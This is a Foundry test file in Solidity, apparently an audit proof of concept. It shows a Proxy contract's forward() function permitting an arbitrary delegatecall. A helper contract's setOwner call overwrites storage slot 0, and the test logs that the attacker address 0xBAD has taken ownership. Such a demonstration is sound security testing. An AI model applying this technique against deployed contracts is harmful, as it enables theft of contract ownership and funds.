// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/proxy.sol";

contract ProxyTest is Test {
    Proxy internal proxy;
    AddressUser internal maliciousContract;
    address internal constant attacker = address(0xBAD);

    function setUp() public {
        // Deploy legitimate proxy contract
        proxy = new Proxy();

        // Deploy malicious contract designed to compromise proxy
        maliciousContract = new AddressUser();
    }

    function testControlledDelegatecall() public {
        address proxyAddress = address(proxy);
        
        // BEFORE: Capture initial state
        bytes32 slot0Initial = vm.load(proxyAddress, bytes32(uint256(0)));
        address initialOwner = address(uint160(uint256(slot0Initial)));
        console.log("--- BEFORE-Trigger State ---");
        console.log("Initial owner via slot0:", initialOwner);
        console.log("Expected initial owner: deployer (address(this))");

        // Log trigger action
        console.log("--- Trigger Operation ---");
        console.log("Executing forward() to malicious contract with attacker payload");

        // Perform the attack
        vm.prank(attacker);
        proxy.forward(
            address(maliciousContract),
            abi.encodeWithSignature("setOwner(address)", attacker)
        );

        // AFTER: Capture post-attack state
        bytes32 slot0After = vm.load(proxyAddress, bytes32(uint256(0)));
        address newOwner = address(uint160(uint256(slot0After)));
        console.log("--- AFTER-Trigger State ---");
        console.log("New owner via slot0:", newOwner);

        // Verify exploitation result
        if (newOwner == attacker) {
            console.log("Exploit SUCCESS: Owner changed to attacker");
            console.log("Vulnerability Exists: Attacker can hijack contract via storage slot manipulation");
        } else {
            console.log("Exploit FAILED: Owner remains unchanged");
            console.log("Vulnerability not Exist: Storage slot write unsuccessful");
        }
    }
}

// Malicious contract designed to manipulate proxy's storage
contract AddressUser {
    address public owner;

    function setOwner(address _newOwner) public {
        owner = _newOwner;
    }
}